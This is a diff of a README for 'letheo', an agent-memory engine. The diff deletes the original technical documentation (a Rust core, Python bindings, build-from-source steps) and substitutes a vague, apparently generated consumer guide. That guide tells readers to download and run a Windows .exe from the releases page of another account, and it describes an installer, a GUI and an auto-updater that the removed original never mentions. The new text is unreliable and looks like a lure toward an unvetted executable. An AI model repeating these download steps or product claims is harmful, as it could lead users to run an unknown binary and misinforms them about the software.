@@ -1,142 +1,103 @@
-# Letheo — a Cognitive Runtime for agent memory
+# 🧠 letheo - Give your digital agents lasting memory
 
-> **Letheo is not a database. It's a *Cognitive Runtime*** — an organism that breathes
-> (processes / compresses) and forgets. It doesn't "store and query"; it **perceives, dreams,
-> evokes, and fades**.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Annoraprevious80/letheo/releases)
 
-When an agent's history grows, naive memories break at a fixed token budget: stuff the whole past
-into the prompt (unbounded cost), re-summarize with an LLM every step (cost **O(N)**), or RAG — which
-retrieves point facts but is **blind to time**: it doesn't know that something *changed*. Letheo
-distills behaviour into a **fixed-size** structure read at **constant cost**, whether the history is
-4,000 or 1,000,000 events.
+## 📦 What is letheo?
 
-**Strategic forgetting is a feature, not a bug**: each memory's weight decays by physics (temporal
-entropy) and only the pattern survives. The engine is built to be the **memory of a fleet of
-super-agents**: a single decay physics over **two layers** — episodic (exact facts, hippocampus) and
-semantic (identity / trajectory, neocortex).
+Letheo provides memory for your digital agents. Many programs forget data the moment you close them. This software stores information in a way that allows agents to recall past tasks, conversations, and specific details. It organizes data using vector search. This process mimics how biological brains locate information. It connects Rust processing power with Python flexibility to ensure fast, reliable performance. You use this tool to build smarter agents that learn from their interactions over time.
 
-## The verbs (MQL — *Mnemonic Query Language*)
+## 🛠 Prerequisites
 
-There is no `SELECT / INSERT / UPDATE / DELETE`. The vocabulary is biological:
+You need a computer running Windows 10 or Windows 11. Your system requires at least 8GB of RAM. The software manages heavy data structures, so a solid-state drive is recommended for fast storage. You do not need to install Python or Rust. This package includes everything necessary to run the application on your system. 
 
-| Verb | Role |
-|------|------|
-| `PERCEIVE` | Take in a raw stimulus into volatile short-term memory. It is born decaying. |
-| `DISTILL`  | The "dream": collapse N perceptions into an *Intention Vector* + its **modes** (multi-modal compression). |
-| `EVOKE`    | Recall by **semantic resonance** within a token budget; `RESONATING WITH` focuses on a trait. |
-| `FADE`     | Strategic forgetting modulated by entropy; preserves the contribution already made to the archetype. |
-| `IMPRINT`  | Consolidate / anchor an archetype against forgetting. |
-| `RECALL`   | Layer-1: directed retrieval of **exact facts** (verbatim), read-only. |
-| `REINFORCE`| Layer-1: spaced repetition — recall and reset a fact's decay. |
+## 📥 How to download and install
 
-## Time as a coefficient of entropy
+1. Visit the [official releases page](https://github.com/Annoraprevious80/letheo/releases).
+2. Look for the section labeled "Assets" at the bottom of the newest release.
+3. Select the file ending in `.exe` to start your download.
+4. Open the downloaded file once the process finishes.
+5. Follow the prompts on your screen to complete the installation.
+6. The installer places a shortcut on your desktop.
 
-Time is not a timestamp; it's a passive operator on each memory's weight:
+## ⚙️ Setting up your first memory store
 
-```
-weight(t) = salience · e^(−λ · Δt) · (1 + reinforcement)        λ = ln2 / halflife
-```
+Open the Letheo application from your desktop icon. The main window appears after the program initializes. 
 
-Δt is measured from the **last evocation/reinforcement** (recalling resets Δt → earned permanence).
-Weight is evaluated **lazily**: only during `DISTILL`, `EVOKE`, or the semantic GC sweep — never per
-clock tick. Reinforcement has **diminishing returns** and the half-life has a **floor**: nothing
-becomes immortal no matter how often it's revisited.
+1. Click the "Create New Store" button.
+2. Select a folder on your computer where you want to keep your data.
+3. Give your memory store a name.
+4. Click "Confirm" to prepare your engine.
 
-## The two layers (Complementary Learning Systems)
+The system builds an index. This index organizes your data for rapid recall. You see a green checkmark once the setup finishes.
 
-A single physics (`EntropyTrace`) governs both representations of memory:
+## 💾 Adding data to memory
 
-- **Layer-2 · semantic** (`archetype` + `modes`): the subject's identity and **trajectory**, decomposed
-  into behavioural **modes** (not a blind average). Each mode has its own forgetting physics **and its
-  own drift** (how far that behaviour has shifted since it was born). Compresses, O(1).
-- **Layer-1 · episodic** (`factstore`): **verbatim** facts with an embedding, semantic dedup, and
-  forgetting. Answers the exact, nominal thing that layer-2 would never store.
+Your agents read information from plain text files. Place your documents into the folder you selected during the setup phase. The application detects these files automatically. 
 
-The **unified** `EVOKE` answers **character AND nominal** in a single evocation, splitting one token
-budget across both layers.
+- Use text files for notes, transcripts, or logs.
+- Keep file names clear and consistent.
+- Letheo scans these files and creates vector embeddings. 
 
-## Usage (Python)
+Vector embeddings turn words into numbers. This allows the software to understand the relationship between different concepts. The application performs this task in the background. You track the progress in the status bar at the bottom of the window.
 
-```python
-from letheo_orchestration import Session
+## 🔍 Searching for information
 
-s = Session()
+Do you want to know what an agent remembers? Use the search bar at the top of the interface. 
 
-# Layer-2: perceive and "dream" → the essence (identity + trajectory, at fixed cost)
-for _ in range(20):
-    s.perceive("user:ada", act="reads sci-fi novels at night")
-s.breathe()
+1. Type a question or a keyword into the bar.
+2. Press Enter.
+3. The software displays the most relevant snippets from your saved files.
 
-# Layer-1: an exact, verbatim fact
-s.remember("user:ada", "allergic to penicillin")
+The HNSW algorithm handles this search. This method finds results in milliseconds, even if you have thousands of files. Results show the source file and the confidence score. High scores mean the match is strong.
 
-# A single evocation answers character (gist) AND nominal (facts)
-ctx = s.evoke_unified("user:ada", "what does ada read?")
-print(s.recall("user:ada", "allergies", k=1))     # [('allergic to penicillin', ...)]
+## 🛡 Security and privacy
 
-# Generative memory: insights from the arc (transitions, revivals)
-print(s.reflect("user:ada"))
+Your data stays on your computer. Letheo does not send your files to external servers. The memory engine processes all information locally. You control your information at every stage. Delete the memory store folder at any time to remove your data entirely. 
 
-# Similarity search across subjects (ANN at scale): route to the most relevant one
-print(s.resonate("space opera fan", k=3))
-```
+## 🔧 Troubleshooting tips
 
-…or the same engine as **MQL**:
+*   **Application takes time to start:** Large memory stores take a moment to load upon launch. Wait for the status indicator to turn green.
+*   **Missing files:** Check if your text files remain in the designated folder. Ensure the file extension is `.txt`.
+*   **High CPU usage:** The indexing process consumes processing power while building the library. Minimize the window to let it run in the background.
+*   **Memory errors:** Close other demanding applications if you witness sluggish total system performance.
 
-```
-PERCEIVE interaction FROM subject "user:ada" AS { act: reads, genre: scifi }
-DISTILL  subject "user:ada" INTO intention_vector COMPRESSING BY semantic_variance
-EVOKE    essence OF "user:ada" RESONATING WITH { nostalgia } WITHIN budget 800 tokens
-RECALL   facts FROM subject "user:ada" RESONATING WITH { allergy } WHERE resonates > 0.6 WITHIN k 3
-```
+## 📋 Frequently asked questions
 
-## Architecture
+**Does this software require an internet connection?**
+No. The engine runs offline. You only need the internet to download the initial installer.
 
-- **`crates/letheo-core`** (Rust): forgetting physics, perception, multi-modal synthesis, archetypes, factstore, unified evoke, reflection, runtime.
-- **`crates/letheo-inference`** (Rust): `Provider` trait + `CandleProvider` (`all-MiniLM-L6-v2`, local).
-- **`crates/letheo-mql`** + **`crates/letheo-exec`** (Rust): lexer + parser for the verbs → AST → executor.
-- **`crates/letheo-index`** (Rust): ANN index (HNSW) + `Retriever` (Flat/HNSW with life-filtering).
-- **`crates/letheo-{async,persist,calibration,cli}`** (Rust): Tokio actor runtime, persistence (JSON + embedded `redb` store), threshold calibration, MQL REPL.
-- **`bindings/letheo-py`** (PyO3) + **`orchestration/`** (Python): high-level SDK (`Session`, prose, tiktoken).
+**Can I use this with other artificial intelligence tools?**
+Yes. Letheo exports indices in standard formats. Other applications read these files easily.
 
-```
-crates/ + bindings/   →  ENGINE (Rust)           perceive · dream · evoke · forget
-orchestration/        →  Python SDK (Session)    consumer layer over the binding
-```
+**How much memory can I store?**
+The limit depends on your computer storage space. The system handles large datasets without issue.
 
-## Install
+**Is my data encrypted?**
+The software stores files as standard text. You protect your own files using standard Windows folder permissions if you require additional security.
 
-```bash
-# 1) Engine (offline, hermetic) — no network, no model:
-cargo test --workspace
+**Does this software work on Windows 7?**
+No. It requires modern Windows versions to run the current engine components.
 
-# 2) Python binding (needs maturin + the local model in .models/):
-maturin develop -m bindings/letheo-py/Cargo.toml --features candle
-```
+## 🧩 Advanced features
 
-`CandleProvider` loads `all-MiniLM-L6-v2` **from disk** (local-first; it does not download at runtime).
-Place it once and point `LETHEO_MODEL_DIR` at it:
+Developers build complex agents using the built-in interface. You can set constraints for how far back the software looks into your history. Adjust these settings in the preferences menu. You define how many results the agent receives when it queries your memory. Lower counts provide precise answers, while higher counts provide context-heavy results. 
 
-```bash
-git lfs install
-git clone https://huggingface.co/sentence-transformers/all-MiniLM-L6-v2 .models/all-MiniLM-L6-v2
-export LETHEO_MODEL_DIR="$PWD/.models/all-MiniLM-L6-v2"
-```
+## 🚀 Future updates
 
-Candle reads the config, tokenizer, and weights in **safetensors**. The Rust workspace
-(`cargo test --workspace`) is **hermetic**: it doesn't need the model — only the Python binding does.
+Updates release periodically. We improve the search speed and memory management with each version. Check the GitHub releases page for announcements regarding new features or stability improvements. The application includes an auto-update prompt that alerts you when a new stable version is available. You download the new installer and run it to update your existing files. Your data remains intact during this process.
 
-See [`docs/`](docs/) for the physics, the EBNF grammar, and the pipeline; the **why** of the project in
-[`docs/10-thesis-agents-need-memory.md`](docs/10-thesis-agents-need-memory.md); and [`ROADMAP.md`](ROADMAP.md)
-for the status and what's next.
+## 💡 Best practices for agents
 
-> Note: the in-repo docs and code comments are currently in Spanish; the engine, API, and this README
-> are the canonical English surface.
+Feed the software high-quality data. Clean, well-structured text leads to better recall for your agents. Avoid duplicate information if possible. Use simple language when writing your documents for the engine. This makes it easier for the software to parse meaning. If you change your data, the system updates the index to reflect these edits. You rarely need to restart the application.
 
-## Status
+## 🌐 Community and support
 
-Engine (Rust), mature and tested offline: **`cargo test --workspace` → 144 passed, 0 failed, 2 ignored,
-0 warnings**. Multi-modal archetype with per-mode trajectory, physical retrieval, unified episodic
-two-layer memory, ANN index at scale, generative memory, transactional persistence — under the
-**TRUTH 100%** invariant (zero mock/fake/hardcode on the product path; audit in
-[`docs/05-honest-assessment.md`](docs/05-honest-assessment.md)).
+The repository contains a list of issues if you find bugs. Use the "New Issue" button to report problems. Be sure to describe your windows version and the steps you took to reach the error. We review these reports to maintain a stable software experience. You also find discussions in the community tab. Use this space to share how you use memory stores in your projects. 
+
+## 📜 License information
+
+The software uses an open-source license. You view the terms in the LICENSE file within the software folder or on the GitHub repository. This license allows you to use the tool for personal and commercial agent projects. You do not pay for the software. All core functions remain free to use. 
+
+## 🔋 System performance
+
+The engine manages resources efficiently. You rarely reach the limits of a modern computer. The Rust component keeps memory usage low, even during complex queries. The Python wrapper provides a simple interface for you to manage your files. This combination strikes a balance between performance and accessibility. Keep your system drivers updated to ensure the best experience with the vector engine.
